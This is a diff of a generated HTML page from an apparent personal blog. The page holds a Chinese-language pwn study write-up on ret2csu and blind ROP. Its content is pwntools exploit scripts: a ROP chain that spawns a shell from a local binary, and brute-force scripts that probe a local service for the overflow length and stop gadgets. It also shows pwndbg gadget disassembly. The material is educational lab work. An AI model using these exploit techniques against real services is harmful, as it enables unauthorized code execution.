@@ -29,20 +29,20 @@
 <meta property="og:site_name" content="Ganliber&#39;s Home">
 <meta property="og:description" content="关于_libc_csu_init的利用和blind rop的方法。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="d:/Github/pwn/pwn_study/images/ret2csu_segment_fault.png">
-<meta property="og:image" content="d:/Github/pwn/pwn_study/images/stack_reading.png">
-<meta property="og:image" content="d:/Github/pwn/pwn_study/images/brop_gadget.png">
-<meta property="og:image" content="d:/Github/pwn/pwn_study/images/brop_plt.png">
-<meta property="og:image" content="d:/Github/pwn/pwn_study/images/brop_buffer_len.png">
-<meta property="og:image" content="d:/Github/pwn/pwn_study/images/brop_stop_gadgets.png">
-<meta property="og:image" content="d:/Github/pwn/pwn_study/images/brop_puts@plt.png">
+<meta property="og:image" content="https://ganliber.github.io/2022/06/16/pwn/brop/ret2csu_segment_fault.png">
+<meta property="og:image" content="https://ganliber.github.io/2022/06/16/pwn/brop/stack_reading.png">
+<meta property="og:image" content="https://ganliber.github.io/2022/06/16/pwn/brop/brop_gadget.png">
+<meta property="og:image" content="https://ganliber.github.io/2022/06/16/pwn/brop/brop_plt.png">
+<meta property="og:image" content="https://ganliber.github.io/2022/06/16/pwn/brop/brop_buffer_len.png">
+<meta property="og:image" content="https://ganliber.github.io/2022/06/16/pwn/brop/brop_stop_gadgets.png">
+<meta property="og:image" content="https://ganliber.github.io/2022/06/16/pwn/brop/brop_puts@plt.png">
 <meta property="article:published_time" content="2022-06-16T08:47:30.000Z">
-<meta property="article:modified_time" content="2022-06-16T14:58:31.063Z">
+<meta property="article:modified_time" content="2022-06-17T07:26:28.308Z">
 <meta property="article:author" content="Gan Gecen">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="stack">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="d:/Github/pwn/pwn_study/images/ret2csu_segment_fault.png">
+<meta name="twitter:image" content="https://ganliber.github.io/2022/06/16/pwn/brop/ret2csu_segment_fault.png">
 
 <link rel="canonical" href="https://ganliber.github.io/2022/06/16/pwn/brop/">
 
@@ -147,7 +147,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">4</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">5</span></a>
 
   </li>
         <li class="menu-item menu-item-pwn">
@@ -237,10 +237,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2022-06-16 16:47:30 / Modified: 22:58:31" itemprop="dateCreated datePublished" datetime="2022-06-16T16:47:30+08:00">2022-06-16</time>
+              <time title="Created: 2022-06-16 16:47:30" itemprop="dateCreated datePublished" datetime="2022-06-16T16:47:30+08:00">2022-06-16</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-06-17 15:26:28" itemprop="dateModified" datetime="2022-06-17T15:26:28+08:00">2022-06-17</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -378,8 +384,7 @@
 <p>没有<code>16-bytes</code>对齐，因此<code>rsp+0x50</code>没有对齐，然而<code>movaps</code>需要<code>16-bytes</code>对齐，因此执行失败，需要查找ret指令的位置填充栈空间</p>
 </li>
 </ul>
-<h4 id="报错dbg图"><a href="#报错dbg图" class="headerlink" title="报错dbg图"></a>报错<code>dbg</code>图</h4><img src="D:\Github\pwn\pwn_study\images\ret2csu_segment_fault.png" alt="ret2csu_segment_fault" style="zoom:38%;" />
-
+<h4 id="报错dbg图"><a href="#报错dbg图" class="headerlink" title="报错dbg图"></a>报错<code>dbg</code>图</h4><p><img src="/2022/06/16/pwn/brop/ret2csu_segment_fault.png" alt="ret2csu_segment_fault"></p>
 <h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; VA from __libc_csu_init &quot;&quot;&quot;</span></span><br><span class="line">pop_rbx = <span class="number">0x40121b</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401223</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; offset from database &quot;&quot;&quot;</span></span><br><span class="line">offset___libc_start_main_ret = <span class="number">0x24083</span></span><br><span class="line">offset_system = <span class="number">0x0000000000052290</span></span><br><span class="line">offset_dup2 = <span class="number">0x000000000010e8c0</span></span><br><span class="line">offset_read = <span class="number">0x000000000010dfc0</span></span><br><span class="line">offset_write = <span class="number">0x000000000010e060</span></span><br><span class="line">offset_str_bin_sh = <span class="number">0x1b45bd</span></span><br><span class="line">offset___libc_start_main = <span class="number">0x0000000000023f90</span></span><br><span class="line">offset_puts = <span class="number">0x0000000000084420</span></span><br><span class="line">offset_exit = <span class="number">0x0000000000046a40</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; addr of functions in libc &quot;&quot;&quot;</span></span><br><span class="line">addr_write = <span class="number">0x7ffff7ed0060</span></span><br><span class="line"></span><br><span class="line">libcBase = addr_write - offset_write</span><br><span class="line"></span><br><span class="line">addr_system = libcBase + offset_system  <span class="comment"># shell function addr</span></span><br><span class="line"></span><br><span class="line">addr_str_bin_sh = libcBase + offset_str_bin_sh  <span class="comment"># parameter</span></span><br><span class="line"></span><br><span class="line">addr_exit = libcBase + offset_exit  <span class="comment"># exit function</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./level&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = gdb.debug(&quot;./level&quot;,&quot;break main&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = flat(cyclic(132),pop_rdi_ret,addr_str_bin_sh,addr_system,pop_rdi_ret,0,)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">136</span> + p64(ret_addr) +  p64(pop_rdi_ret) + p64(addr_str_bin_sh) + p64(addr_system) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(addr_exit)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload_error = b&#x27;a&#x27; * 136 +  p64(pop_rdi_ret) + p64(addr_str_bin_sh) + p64(addr_system) + p64(pop_rdi_ret) + p64(0) + p64(addr_exit)</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># io.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
@@ -435,9 +440,7 @@
 <li><p>在 32 位的情况下，我们最多需要爆破 1024 次，64 位最多爆破 2048 次。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>原理 &lt;&lt;&lt;</span><br><span class="line">调节payload的长度,每次暴力破解一个字节的内容(即payload尾部),如果该byte破解,则payload再加一字节的内容,作为`canary`中的下一部分(byte)</span><br><span class="line">------------------------------</span><br><span class="line">Every Byte includes <span class="number">256</span> = <span class="number">2</span>^<span class="number">8</span></span><br><span class="line"><span class="number">32</span>-bit : <span class="number">4</span> * <span class="number">2</span>^<span class="number">8</span> = <span class="number">2</span>^<span class="number">10</span> = <span class="number">1024</span></span><br><span class="line"><span class="number">64</span>-bit : <span class="number">8</span> * <span class="number">2</span>^<span class="number">8</span> = <span class="number">2</span>^<span class="number">11</span> = <span class="number">2048</span></span><br><span class="line">------------------------------</span><br></pre></td></tr></table></figure>
 
-
-
-<p><img src="D:\Github\pwn\pwn_study\images\stack_reading.png" alt="stack_reading"></p>
+<p><img src="/2022/06/16/pwn/brop/stack_reading.png" alt="stack_reading"></p>
 </li>
 </ul>
 </li>
@@ -488,7 +491,7 @@
 <p>从不同偏移处开始反汇编，可以得到对不同<code>register</code>的控制！！！</p>
 <p>最关键的是<code>pop rdi</code>和<code>rsi</code>，设计64位的头两个参数</p>
 </blockquote>
-<p><img src="D:\Github\pwn\pwn_study\images\brop_gadget.png" alt="brop_gadget"></p>
+<p><img src="/2022/06/16/pwn/brop/brop_gadget.png" alt="brop_gadget"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble 0x4007ba,0x4007c5</span><br><span class="line">Dump of assembler code from 0x4007ba to 0x4007c5:</span><br><span class="line">   0x00000000004007ba &lt;__libc_csu_init+90&gt;:	pop    rbx</span><br><span class="line">   0x00000000004007bb &lt;__libc_csu_init+91&gt;:	pop    rbp</span><br><span class="line">   0x00000000004007bc &lt;__libc_csu_init+92&gt;:	pop    r12</span><br><span class="line">   0x00000000004007be &lt;__libc_csu_init+94&gt;:	pop    r13</span><br><span class="line">   0x00000000004007c0 &lt;__libc_csu_init+96&gt;:	pop    r14</span><br><span class="line">   0x00000000004007c2 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">   0x00000000004007c4 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">pwndbg&gt; disassemble 0x4007ba+0x7,0x4007c5</span><br><span class="line">Dump of assembler code from 0x4007c1 to 0x4007c5:</span><br><span class="line">   0x00000000004007c1 &lt;__libc_csu_init+97&gt;:	pop    rsi</span><br><span class="line">   0x00000000004007c2 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">   0x00000000004007c4 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">pwndbg&gt; disassemble 0x4007ba+0x9,0x4007c5</span><br><span class="line">Dump of assembler code from 0x4007c3 to 0x4007c5:</span><br><span class="line">   0x00000000004007c3 &lt;__libc_csu_init+99&gt;:	pop    rdi</span><br><span class="line">   0x00000000004007c4 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
 
 
@@ -544,7 +547,7 @@
 <h4 id="寻找-plt"><a href="#寻找-plt" class="headerlink" title="寻找 plt"></a>寻找 plt</h4><blockquote>
 <p>如下图所示，程序的 plt 表具有比较规整的结构，每一个 plt 表项都是 <code>16</code> 字节。而且，在每一个表项的 <code>6</code> 字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 地址进行解析。</p>
 </blockquote>
-<p><img src="D:\Github\pwn\pwn_study\images\brop_plt.png" alt="brop_plt"></p>
+<p><img src="/2022/06/16/pwn/brop/brop_plt.png" alt="brop_plt"></p>
 <blockquote>
 <p>对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了<strong>一系列的长度为 16 的没有使得程序崩溃的代码段</strong>，那么我们有一定的理由相信我们遇到了 <code>plt</code> 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。</p>
 </blockquote>
@@ -598,7 +601,9 @@
 <h3 id="确定栈溢出长度"><a href="#确定栈溢出长度" class="headerlink" title="确定栈溢出长度"></a>确定栈溢出长度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getbuffer_len</span>():</span><br><span class="line">  i=<span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">      io.recvuntil(<span class="string">b&#x27;WelCome my friend,Do you know password?\n&#x27;</span>)</span><br><span class="line">      io.send(i*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">      output = io.recv()</span><br><span class="line">      io.close()</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">b&#x27;No password&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    buffer_len = getbuffer_len()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The length of buffer overflow is &quot;</span>,buffer_len)</span><br></pre></td></tr></table></figure>
 
 <p>最终得到<code>buffer</code>长度</p>
-<img src="D:\Github\pwn\pwn_study\images\brop_buffer_len.png" alt="brop_buffer_len" style="zoom:50%;" />
+<img src="brop_buffer_len.png" alt="brop_buffer_len" style="zoom:50%;" />
+
+
 
 <p>首先确定，栈溢出的长度为 72。同时，根据回显信息可以发现程序并没有开启 canary 保护，否则，就会有相应的报错内容。所以我们不需要执行 stack reading。</p>
 <h3 id="寻找-stop-gadgets"><a href="#寻找-stop-gadgets" class="headerlink" title="寻找 stop gadgets"></a>寻找 stop gadgets</h3><blockquote>
@@ -607,7 +612,12 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop_addr</span>(<span class="params">length</span>):</span><br><span class="line">  addr = <span class="number">0x4006b0</span>  <span class="comment"># No PIE</span></span><br><span class="line">  <span class="keyword">while</span> <span class="number">1</span> :</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">      io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">      io.recvuntil(<span class="string">b&#x27;WelCome my friend,Do you know password?\n&#x27;</span>)</span><br><span class="line">      payload = <span class="string">b&#x27;a&#x27;</span>*length + p64(addr)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;Temporary address is 0x%x&#x27;</span>%(addr))</span><br><span class="line">      io.sendline(payload)</span><br><span class="line">      content = io.recv()  <span class="comment"># if recv() doesn&#x27;t cause crash, it means that it is a stop gadgets</span></span><br><span class="line">      io.close()  <span class="comment"># sometimes _start will not cause crash</span></span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;One success addr: 0x%x&#x27;</span> % (addr))</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;When the addr is found successfully, you will recieve the message from the remote: &#x27;</span>,content)</span><br><span class="line">      <span class="keyword">return</span> addr</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">      addr += <span class="number">1</span></span><br><span class="line">      io.close()</span><br></pre></td></tr></table></figure>
 
 <p>结合中间输出可以让结果有迹可循一点，次数找到了<code>0x4006b6</code>，为了找到开始地址，可以输出程序没有崩溃时的接收结果，看是否与程序开始时候的提示一致。</p>
-<p><img src="D:\Github\pwn\pwn_study\images\brop_stop_gadgets.png" alt="brop_stop_gadgets"></p>
+<img src="brop_stop_gadgets.png" alt="brop_stop_gadgets" style="zoom:38%;" />
+
+
+
+
+
 <h3 id="寻找-brop-gadgets"><a href="#寻找-brop-gadgets" class="headerlink" title="寻找 brop gadgets"></a>寻找 brop gadgets</h3><blockquote>
 <p>此处是为了找到<code>__libc_csu_init</code>的末尾那一段重要部分，即</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] </span><br><span class="line">pop rbx, pop rbp, pop r12, pop r13, pop r14, pop r15, ret</span><br><span class="line">[*] + 0x7 </span><br><span class="line">pop rsi, pop r15, ret</span><br><span class="line">[*] + 0x9</span><br><span class="line">pop rdi, ret</span><br></pre></td></tr></table></figure>
@@ -641,7 +651,7 @@
 <blockquote>
 <p>借此可以确定在泄漏<code>puts@got</code>地址后找到<code>puts</code>的真正的地址，进而泄漏<code>libc</code>的版本</p>
 </blockquote>
-<p><img src="D:\Github\pwn\pwn_study\images\brop_puts@plt.png" alt="brop_puts@plt"></p>
+<p><img src="/2022/06/16/pwn/brop/brop_puts@plt.png" alt="brop_puts@plt"></p>
 <h3 id="泄漏-addr-gt-puts-got"><a href="#泄漏-addr-gt-puts-got" class="headerlink" title="泄漏 addr-&gt;puts@got"></a>泄漏 addr-&gt;puts@got</h3><blockquote>
 <ol>
 <li>泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 &#x2F; bin&#x2F;sh 地址，从而获取 shell</li>
@@ -726,10 +736,13 @@
 
         
     <div class="post-nav">
-      <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/2022/06/16/system/ucore_lab4/" rel="next" title="ucore_lab4">
-      ucore_lab4 <i class="fa fa-chevron-right"></i>
+    <a href="/2022/06/16/system/ucore_lab4/" rel="prev" title="ucore_lab4">
+      <i class="fa fa-chevron-left"></i> ucore_lab4
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/06/16/pwn/heap-1/" rel="next" title="Heap 1">
+      Heap 1 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -812,7 +825,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
